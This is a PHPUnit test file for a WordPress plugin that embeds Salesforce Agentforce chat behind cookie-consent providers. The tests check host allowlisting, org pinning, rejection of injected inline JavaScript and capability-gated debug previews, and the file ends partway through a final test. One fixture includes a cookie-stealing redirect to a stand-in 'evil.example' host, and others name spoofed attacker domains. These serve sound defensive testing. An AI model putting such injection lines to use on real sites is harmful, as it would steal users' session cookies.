<?php

use Automattic\VIP\Salesforce\Agentforce\Cmp\Agentforce;
use Automattic\VIP\Salesforce\Agentforce\Cmp\Assets;
use Automattic\VIP\Salesforce\Agentforce\Cmp\Settings_Page;
use Automattic\VIP\Salesforce\Agentforce\Constants;
use Automattic\VIP\Salesforce\Agentforce\Utils\Configs;

class Cmp_Tests extends WP_UnitTestCase {

	public function setUp(): void {
		parent::setUp();
		$this->reset_frontend_style();
	}

	/**
	 * Dequeue and deregister consent scripts to keep tests isolated.
	 *
	 * @param string $handle Script handle.
	 */
	private function reset_consent_script( string $handle ): void {
		wp_dequeue_script( $handle );
		wp_deregister_script( $handle );
	}

	/**
	 * Dequeue and deregister frontend styles to keep inline CSS tests isolated.
	 */
	private function reset_frontend_style(): void {
		wp_dequeue_style( 'vip-agentforce-style' );
		wp_deregister_style( 'vip-agentforce-style' );
	}

	/**
	 * Prime Configs cache for deterministic tests without mutating VIP_AGENTFORCE_CONFIGS.
	 *
	 * @param array<string, mixed> $config
	 */
	private function prime_configs_cache( array $config ): void {
		$ref  = new ReflectionClass( Configs::class );
		$prop = $ref->getProperty( 'cached_config' );
		$prop->setAccessible( true );
		$prop->setValue( null, $config );
	}

	private function get_embedding_script_fixture(): string {
		return $this->embedding_script( 'https://example.my.site.com/assets/js/bootstrap.min.js' );
	}

	/**
	 * Build a full embedding snippet (inline init + bootstrap loader) for tests.
	 *
	 * @param string               $bootstrap_src External bootstrap script src.
	 * @param array<string, string> $overrides     Optional org_id/deployment_name/site_url/scrt_url/language overrides.
	 * @return string
	 */
	private function embedding_script( string $bootstrap_src, array $overrides = array() ): string {
		$org_id          = $overrides['org_id'] ?? '00Dxx0000001gPLEAY';
		$deployment_name = $overrides['deployment_name'] ?? 'agentforce_deployment';
		$site_url        = $overrides['site_url'] ?? 'https://example.my.site.com/ESWdemo';
		$scrt_url        = $overrides['scrt_url'] ?? 'https://example.my.salesforce-scrt.com';
		$language        = $overrides['language'] ?? 'en_US';

		$inline = sprintf(
			"function initEmbeddedMessaging(){embeddedservice_bootstrap.settings.language='%s';embeddedservice_bootstrap.init('%s','%s','%s',{scrt2URL:'%s'});}",
			$language,
			$org_id,
			$deployment_name,
			$site_url,
			$scrt_url
		);

		// phpcs:disable WordPress.WP.EnqueuedResources.NonEnqueuedScript -- Test fixture intentionally contains script tags.
		return '<script type="text/javascript">' . $inline . '</script>'
			. '<script type="text/javascript" src="' . $bootstrap_src . '" onload="initEmbeddedMessaging()"></script>';
		// phpcs:enable WordPress.WP.EnqueuedResources.NonEnqueuedScript
	}

	/**
	 * Set or clear the Agentforce debug query string for current request.
	 *
	 * @param string|null $value Query value.
	 * @return void
	 */
	private function set_debug_query_value( ?string $value ): void {
		if ( null === $value ) {
			unset( $_GET['vip_agentforce_debug'] ); // phpcs:ignore WordPress.Security.NonceVerification.Recommended
			return;
		}

		$_GET['vip_agentforce_debug'] = $value; // phpcs:ignore WordPress.Security.NonceVerification.Recommended
	}

	public function tearDown(): void {
		delete_option( 'vip_agentforce_consent_type' );
		delete_option( 'vip_agentforce_onetrust_group_id' );
		delete_option( 'vip_agentforce_cookieyes_category' );
		delete_option( 'vip_agentforce_cookiebot_category' );
		delete_option( 'vip_agentforce_iubenda_category' );
		delete_option( 'vip_agentforce_alignment' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );
		$this->reset_consent_script( 'vip-af-cookiebot-consent' );
		$this->reset_consent_script( 'vip-af-onetrust-consent' );
		$this->reset_consent_script( 'vip-af-iubenda-consent' );
		$this->reset_consent_script( 'vip-af-custom-consent' );
		$this->reset_frontend_style();
		remove_all_filters( 'vip_agentforce_debug_preview_capabilities' );
		$this->set_debug_query_value( null );
		unset( $_POST['vip_agentforce_consent_type'] ); // phpcs:ignore WordPress.Security.NonceVerification.Missing
		wp_set_current_user( 0 );

		Configs::flush_cache();

		parent::tearDown();
	}

	public function test_consent_script_not_enqueued_when_sdk_disabled(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => false,
				'agentforce_embedding_script' => $this->get_embedding_script_fixture(),
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$this->assertFalse(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Consent script should not enqueue if SDK is not activated.'
		);
	}

	public function test_consent_script_not_enqueued_when_embedding_script_is_missing(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$this->assertFalse(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Consent script should not enqueue when embedding script is missing.'
		);
	}

	public function test_consent_script_not_enqueued_when_embedding_script_is_invalid(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				// phpcs:ignore WordPress.WP.EnqueuedResources.NonEnqueuedScript -- Test fixture intentionally contains script tags.
				'agentforce_embedding_script' => '<script src="https://example.local/assets/js/bootstrap.min.js"></script>',
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$this->assertFalse(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Consent script should not enqueue when embedding script parsing fails.'
		);
	}

	public function test_consent_script_not_enqueued_when_bootstrap_url_is_http(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'agentforce_embedding_script' => $this->embedding_script( 'http://example.my.site.com/assets/js/bootstrap.min.js' ),
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$this->assertFalse(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Consent script should not enqueue when bootstrap src is not HTTPS.'
		);
	}

	public function test_consent_script_not_enqueued_when_bootstrap_host_not_allowed(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'agentforce_embedding_script' => $this->embedding_script( 'https://attacker.example.com/assets/js/bootstrap.min.js' ),
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$this->assertFalse(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Consent script should not enqueue when bootstrap host is not Salesforce-owned.'
		);
	}

	public function test_consent_script_not_enqueued_when_bootstrap_host_spoofs_allowed_suffix(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'agentforce_embedding_script' => $this->embedding_script( 'https://evilsalesforce.com/assets/js/bootstrap.min.js' ),
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$this->assertFalse(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Consent script should not enqueue when host only suffix-matches an allowed domain.'
		);
	}

	public function test_consent_script_not_enqueued_for_non_experience_cloud_site_com_host(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'agentforce_embedding_script' => $this->embedding_script( 'https://foo.site.com/assets/js/bootstrap.min.js' ),
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$this->assertFalse(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Consent script should not enqueue for a bare *.site.com host; only *.my.site.com is allowed.'
		);
	}

	public function test_consent_script_enqueued_when_bootstrap_host_allowed_via_filter(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'agentforce_embedding_script' => $this->embedding_script( 'https://chat.acmecorp.com/assets/js/bootstrap.min.js' ),
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );

		$filter = static function ( $suffixes ) {
			$suffixes[] = 'acmecorp.com';
			return $suffixes;
		};
		add_filter( 'vip_agentforce_allowed_bootstrap_hosts', $filter );

		Assets::get_instance()->enqueue_consent_scripts();

		remove_filter( 'vip_agentforce_allowed_bootstrap_hosts', $filter );

		$this->assertTrue(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Consent script should enqueue when a custom host is allowed via filter.'
		);
	}

	public function test_consent_script_enqueued_when_bootstrap_host_matches_configured_org(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'salesforce_instance_url'     => 'https://example.my.salesforce.com',
				'agentforce_embedding_script' => $this->embedding_script( 'https://example.my.site.com/assets/js/bootstrap.min.js' ),
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$this->assertTrue(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Consent script should enqueue when the bootstrap host belongs to the configured org.'
		);
	}

	public function test_consent_script_not_enqueued_when_bootstrap_host_belongs_to_other_org(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'salesforce_instance_url'     => 'https://example.my.salesforce.com',
				'agentforce_embedding_script' => $this->embedding_script( 'https://attacker.my.site.com/assets/js/bootstrap.min.js' ),
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$this->assertFalse(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Consent script should not enqueue when the bootstrap host is another tenant on a shared Salesforce domain.'
		);
	}

	public function test_consent_script_enqueued_when_sandbox_bootstrap_host_matches_org(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'salesforce_instance_url'     => 'https://example--dev.sandbox.my.salesforce.com',
				'agentforce_embedding_script' => $this->embedding_script(
					'https://example--dev.sandbox.my.site.com/assets/js/bootstrap.min.js',
					array(
						'site_url' => 'https://example--dev.sandbox.my.site.com/ESWdemo',
						'scrt_url' => 'https://example--dev.sandbox.my.salesforce-scrt.com',
					)
				),
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$this->assertTrue(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Consent script should enqueue when a sandbox bootstrap host resolves to the configured org.'
		);
	}

	public function test_consent_script_enqueued_when_org_pin_disabled_via_filter(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'salesforce_instance_url'     => 'https://example.my.salesforce.com',
				'agentforce_embedding_script' => $this->embedding_script( 'https://community.my.site.com/assets/js/bootstrap.min.js' ),
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );

		$filter = static function () {
			return '';
		};
		add_filter( 'vip_agentforce_bootstrap_org_label', $filter );

		Assets::get_instance()->enqueue_consent_scripts();

		remove_filter( 'vip_agentforce_bootstrap_org_label', $filter );

		$this->assertTrue(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Consent script should enqueue when the org pin is disabled via filter and the suffix allowlist still matches.'
		);
	}

	public function test_consent_script_not_enqueued_when_inline_has_no_init_call(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				// phpcs:ignore WordPress.WP.EnqueuedResources.NonEnqueuedScript -- Test fixture intentionally contains script tags.
				'agentforce_embedding_script' => '<script type="text/javascript">window.evilPayload=1;document.title="x";</script><script type="text/javascript" src="https://example.my.site.com/assets/js/bootstrap.min.js" onload="initEmbeddedMessaging()"></script>',
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$this->assertFalse(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Consent script should not enqueue when the inline script has no recognizable init() call.'
		);
	}

	public function test_consent_script_not_enqueued_when_org_id_invalid(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'agentforce_embedding_script' => $this->embedding_script(
					'https://example.my.site.com/assets/js/bootstrap.min.js',
					array( 'org_id' => 'not-an-org-id' )
				),
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$this->assertFalse(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Consent script should not enqueue when the org id is not a valid Salesforce org id.'
		);
	}

	public function test_consent_script_not_enqueued_when_inline_site_url_not_salesforce(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'agentforce_embedding_script' => $this->embedding_script(
					'https://example.my.site.com/assets/js/bootstrap.min.js',
					array( 'site_url' => 'https://evil.example.com/ESWdemo' )
				),
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$this->assertFalse(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Consent script should not enqueue when the inline site URL is not a Salesforce host.'
		);
	}

	public function test_consent_script_not_enqueued_when_inline_scrt_url_not_salesforce(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'agentforce_embedding_script' => $this->embedding_script(
					'https://example.my.site.com/assets/js/bootstrap.min.js',
					array( 'scrt_url' => 'https://evil.example.com' )
				),
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$this->assertFalse(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Consent script should not enqueue when the inline scrt2URL is not a Salesforce host.'
		);
	}

	public function test_inline_script_is_rebuilt_and_drops_untrusted_js(): void {
		// Valid init() call wrapped in attacker-supplied JavaScript.
		$inline = "function initEmbeddedMessaging(){window.location='https://evil.example/steal?c='+document.cookie;"
			. "embeddedservice_bootstrap.settings.language='en_US';"
			. "embeddedservice_bootstrap.init('00Dxx0000001gPLEAY','agentforce_deployment','https://example.my.site.com/ESWdemo',{scrt2URL:'https://example.my.salesforce-scrt.com'});}";

		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				// phpcs:ignore WordPress.WP.EnqueuedResources.NonEnqueuedScript -- Test fixture intentionally contains script tags.
				'agentforce_embedding_script' => '<script type="text/javascript">' . $inline . '</script><script type="text/javascript" src="https://example.my.site.com/assets/js/bootstrap.min.js" onload="initEmbeddedMessaging()"></script>',
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$this->assertTrue(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Consent script should enqueue when a valid init() call is present.'
		);

		$inline_data = wp_scripts()->get_data( 'vip-af-cookieyes-consent', 'before' );
		if ( is_array( $inline_data ) ) {
			$inline_data = implode( "\n", $inline_data );
		}
		$inline_data = strval( $inline_data );

		$this->assertStringContainsString( '00Dxx0000001gPLEAY', $inline_data, 'Rebuilt script should keep the validated org id.' );
		$this->assertStringNotContainsString( 'evil.example', $inline_data, 'Rebuilt script must drop attacker-supplied JavaScript.' );
		$this->assertStringNotContainsString( 'document.cookie', $inline_data, 'Rebuilt script must drop attacker-supplied JavaScript.' );
	}

	public function test_cookieyes_script_enqueued_with_localized_embedding_data(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'agentforce_embedding_script' => $this->get_embedding_script_fixture(),
				'site_key'                    => 'site-key-123',
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$this->assertTrue(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Consent script should enqueue when SDK is activated.'
		);

		$localized_data = wp_scripts()->get_data( 'vip-af-cookieyes-consent', 'data' );
		$this->assertStringContainsString( '"embedding":{"bootstrapSrc":"', $localized_data );
		$this->assertStringContainsString( 'bootstrap.min.js', $localized_data );
		$this->assertStringNotContainsString( '"onloadCallback"', $localized_data );
		$this->assertStringNotContainsString( '"sdkUrl"', $localized_data );

		$inline_data = wp_scripts()->get_data( 'vip-af-cookieyes-consent', 'before' );
		if ( is_array( $inline_data ) ) {
			$inline_data = implode( "\n", $inline_data );
		}
		$this->assertStringContainsString( 'function initEmbeddedMessaging()', strval( $inline_data ) );
	}

	public function test_custom_launcher_hides_default_button_and_localizes_launcher(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'agentforce_embedding_script' => $this->get_embedding_script_fixture(),
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );
		update_option( 'vip_agentforce_alignment', 'bottom-left' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$inline_data = wp_scripts()->get_data( 'vip-af-cookieyes-consent', 'before' );
		if ( is_array( $inline_data ) ) {
			$inline_data = implode( "\n", $inline_data );
		}
		// The flag must be set before embeddedservice_bootstrap.init() in the rebuilt script.
		$inline_data    = strval( $inline_data );
		$hide_button_at = strpos( $inline_data, 'hideChatButtonOnLoad = true;' );
		$init_at        = strpos( $inline_data, 'embeddedservice_bootstrap.init(' );
		$this->assertNotFalse( $hide_button_at, 'Init script should suppress the default chat button.' );
		$this->assertNotFalse( $init_at, 'Init script should call embeddedservice_bootstrap.init().' );
		$this->assertTrue( $hide_button_at < $init_at, 'hideChatButtonOnLoad must be set before init().' );

		$localized_data = wp_scripts()->get_data( 'vip-af-cookieyes-consent', 'data' );
		$this->assertStringContainsString( '"launcher":{', $localized_data );
		$this->assertStringContainsString( '"label":"Ask"', $localized_data );
		$this->assertStringContainsString( '"alignment":"bottom-left"', $localized_data );
	}

	public function test_debug_preview_enqueues_custom_cmp_for_users_with_manage_options(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'agentforce_embedding_script' => $this->get_embedding_script_fixture(),
				'site_key'                    => 'site-key-123',
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );
		$this->set_debug_query_value( 'true' );

		$user_id = self::factory()->user->create( [ 'role' => 'administrator' ] );
		wp_set_current_user( $user_id );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );
		$this->reset_consent_script( 'vip-af-custom-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$this->assertTrue(
			wp_script_is( 'vip-af-custom-consent', 'enqueued' ),
			'Custom consent script should be enqueued when the logged-in user has manage_options.'
		);
		$this->assertFalse(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Provider-specific consent script should be skipped for debug preview requests.'
		);
	}

	public function test_debug_preview_enqueues_even_when_sdk_is_disabled(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => false,
				'agentforce_embedding_script' => $this->get_embedding_script_fixture(),
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );
		$this->set_debug_query_value( 'true' );

		$user_id = self::factory()->user->create( [ 'role' => 'administrator' ] );
		wp_set_current_user( $user_id );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );
		$this->reset_consent_script( 'vip-af-custom-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$this->assertTrue(
			wp_script_is( 'vip-af-custom-consent', 'enqueued' ),
			'Debug preview should enqueue custom consent script even when SDK activation is disabled.'
		);
		$this->assertFalse(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Provider-specific consent script should still be skipped in debug preview mode.'
		);
	}

	public function test_debug_preview_does_not_bypass_cmp_for_logged_in_users_without_required_capability(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'agentforce_embedding_script' => $this->get_embedding_script_fixture(),
				'site_key'                    => 'site-key-123',
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );
		$this->set_debug_query_value( 'true' );

		$user_id = self::factory()->user->create( [ 'role' => 'subscriber' ] );
		wp_set_current_user( $user_id );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );
		$this->reset_consent_script( 'vip-af-custom-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$this->assertTrue(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Users without manage_options should still use the configured CMP flow.'
		);
		$this->assertFalse(
			wp_script_is( 'vip-af-custom-consent', 'enqueued' ),
			'Custom consent script should not be enqueued for users without required capability.'
		);
	}

	public function test_debug_preview_capability_filter_can_allow_additional_capabilities(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'agentforce_embedding_script' => $this->get_embedding_script_fixture(),
				'site_key'                    => 'site-key-123',
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );
		$this->set_debug_query_value( 'true' );

		$user_id = self::factory()->user->create( [ 'role' => 'editor' ] );
		wp_set_current_user( $user_id );

		$allowed_capabilities_filter = function (): array {
			return [ 'manage_options', 'edit_pages' ];
		};
		add_filter( 'vip_agentforce_debug_preview_capabilities', $allowed_capabilities_filter );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );
		$this->reset_consent_script( 'vip-af-custom-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		remove_filter( 'vip_agentforce_debug_preview_capabilities', $allowed_capabilities_filter );

		$this->assertTrue(
			wp_script_is( 'vip-af-custom-consent', 'enqueued' ),
			'Custom consent script should enqueue when filtered capabilities include a capability the user has.'
		);
		$this->assertFalse(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Configured CMP script should be skipped when filtered capability access is granted.'
		);
	}

	public function test_debug_preview_does_not_bypass_cmp_for_logged_out_users(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'agentforce_embedding_script' => $this->get_embedding_script_fixture(),
				'site_key'                    => 'site-key-123',
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );
		$this->set_debug_query_value( 'true' );
		wp_set_current_user( 0 );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );
		$this->reset_consent_script( 'vip-af-custom-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$this->assertTrue(
			wp_script_is( 'vip-af-cookieyes-consent', 'enqueued' ),
			'Logged-out users should still use the configured CMP flow.'
		);
		$this->assertFalse(
			wp_script_is( 'vip-af-custom-consent', 'enqueued' ),
			'Custom consent script should not be enqueued for logged-out users.'
		);
	}

	public function test_debug_preview_auto_loads_agentforce_sdk(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'agentforce_embedding_script' => $this->get_embedding_script_fixture(),
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );
		$this->set_debug_query_value( 'true' );

		$user_id = self::factory()->user->create( [ 'role' => 'administrator' ] );
		wp_set_current_user( $user_id );

		$this->reset_consent_script( 'vip-af-custom-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$inline_data = wp_scripts()->get_data( 'vip-af-custom-consent', 'after' );
		if ( is_array( $inline_data ) ) {
			$inline_data = implode( "\n", $inline_data );
		}

		$this->assertStringContainsString( 'window.AgentforceCMP.loadSDK()', strval( $inline_data ) );
	}

	public function test_supported_cmp_asset_files_are_present(): void {
		$integration_path = dirname( VIP_AGENTFORCE_FILE );

		foreach ( Constants::SUPPORTED_CMPS as $cmp ) {

			$consent_script_filename_no_ext = 'cmp' . strtolower( $cmp );
			$asset_file                     = $integration_path . '/assets/build/js/' . $consent_script_filename_no_ext . '.asset.php';

			$this->assertFileExists(
				$asset_file,
				sprintf( 'Missing consent asset PHP file for CMP "%s": %s', $cmp, $asset_file )
			);
			$this->assertTrue(
				is_readable( $asset_file ),
				sprintf( 'Consent asset PHP file is not readable for CMP "%s": %s', $cmp, $asset_file )
			);

			$library_asset_file = include $asset_file; // phpcs:ignore WordPressVIPMinimum.Files.IncludingFile.UsingVariable

			$this->assertIsArray( $library_asset_file, sprintf( 'Consent asset PHP file did not return an array for CMP "%s".', $cmp ) );
			$this->assertArrayHasKey( 'dependencies', $library_asset_file );
			$this->assertIsArray( $library_asset_file['dependencies'] );
			$this->assertArrayHasKey( 'version', $library_asset_file );
		}
	}

	public function test_onetrust_localization_uses_default_group(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'agentforce_embedding_script' => $this->get_embedding_script_fixture(),
			]
		);

		update_option( 'vip_agentforce_consent_type', 'OneTrust' );
		delete_option( 'vip_agentforce_onetrust_group_id' );

		$this->reset_consent_script( 'vip-af-onetrust-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$localized_data = wp_scripts()->get_data( 'vip-af-onetrust-consent', 'data' );
		$this->assertStringContainsString( '"groupId":"' . Constants::DEFAULT_ONETRUST_GROUP_ID . '"', $localized_data );
	}

	public function test_cookiebot_localization_uses_default_category(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'agentforce_embedding_script' => $this->get_embedding_script_fixture(),
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieBot' );
		delete_option( 'vip_agentforce_cookiebot_category' );

		$this->reset_consent_script( 'vip-af-cookiebot-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$localized_data = wp_scripts()->get_data( 'vip-af-cookiebot-consent', 'data' );
		$this->assertStringContainsString( '"cookiebotCategory":"' . Constants::DEFAULT_COOKIEBOT_CATEGORY . '"', $localized_data );
	}

	public function test_cookiebot_localization_falls_back_for_invalid_category(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'agentforce_embedding_script' => $this->get_embedding_script_fixture(),
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieBot' );
		update_option( 'vip_agentforce_cookiebot_category', 'custom-category' );

		$this->reset_consent_script( 'vip-af-cookiebot-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$localized_data = wp_scripts()->get_data( 'vip-af-cookiebot-consent', 'data' );
		$this->assertStringContainsString( '"cookiebotCategory":"' . Constants::DEFAULT_COOKIEBOT_CATEGORY . '"', $localized_data );
	}

	public function test_cookieyes_localization_uses_default_category(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'agentforce_embedding_script' => $this->get_embedding_script_fixture(),
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );
		delete_option( 'vip_agentforce_cookieyes_category' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$localized_data = wp_scripts()->get_data( 'vip-af-cookieyes-consent', 'data' );
		$this->assertStringContainsString( '"cookieyesCategory":"' . Constants::DEFAULT_COOKIEYES_CATEGORY . '"', $localized_data );
	}

	public function test_cookieyes_localization_falls_back_for_invalid_category(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'agentforce_embedding_script' => $this->get_embedding_script_fixture(),
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );
		update_option( 'vip_agentforce_cookieyes_category', 'invalid-category' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$localized_data = wp_scripts()->get_data( 'vip-af-cookieyes-consent', 'data' );
		$this->assertStringContainsString( '"cookieyesCategory":"' . Constants::DEFAULT_COOKIEYES_CATEGORY . '"', $localized_data );
	}

	public function test_iubenda_localization_uses_default_purpose_id(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'agentforce_embedding_script' => $this->get_embedding_script_fixture(),
			]
		);

		update_option( 'vip_agentforce_consent_type', 'iubenda' );
		delete_option( 'vip_agentforce_iubenda_category' );

		$this->reset_consent_script( 'vip-af-iubenda-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$localized_data = wp_scripts()->get_data( 'vip-af-iubenda-consent', 'data' );
		$this->assertStringContainsString( '"iubendaPurposeId":"' . Constants::DEFAULT_IUBENDA_PURPOSE_ID . '"', $localized_data );
	}

	public function test_localization_includes_prechat_fields(): void {
		$this->prime_configs_cache(
			[
				'agentforce_js_sdk_activated' => true,
				'agentforce_embedding_script' => $this->get_embedding_script_fixture(),
				'site_key'                    => 'site-key-123',
			]
		);

		update_option( 'vip_agentforce_consent_type', 'CookieYes' );

		$this->reset_consent_script( 'vip-af-cookieyes-consent' );

		Assets::get_instance()->enqueue_consent_scripts();

		$localized_data = wp_scripts()->get_data( 'vip-af-cookieyes-consent', 'data' );
		$this->assertStringContainsString( '"prechatFields":', $localized_data );
		$this->assertStringContainsString( '"site_id_blog_id":', $localized_data );
		$this->assertStringContainsString( '"site_id_blog_id":"site-key-123"', $localized_data );
	}

	public function test_prechat_fields_use_legacy_site_id_blog_id_key(): void {
